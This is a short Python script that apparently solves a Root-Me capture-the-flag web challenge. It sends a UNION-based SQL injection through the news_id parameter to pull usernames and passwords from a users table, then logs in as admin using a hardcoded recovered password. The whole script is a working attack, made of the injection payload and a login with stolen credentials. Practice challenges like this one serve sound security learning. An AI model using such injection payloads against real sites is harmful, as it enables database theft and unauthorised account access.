import requests
from bs4 import BeautifulSoup

url="http://challenge01.root-me.org/web-serveur/ch18/?action=login"
url1="http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2 union select 1, username, password from users--"

s = requests.session()

res1 = s.get(url1)


soup = BeautifulSoup(res1.text, 'html.parser')
#print(soup.prettify())
user = "admin"
password = "aTlkJYLjcbLmue3"

payload={'login':user, 'password':password}

res = s.post(url, data=payload)
soup2 = BeautifulSoup(res.text, 'html.parser')
print(soup2.prettify())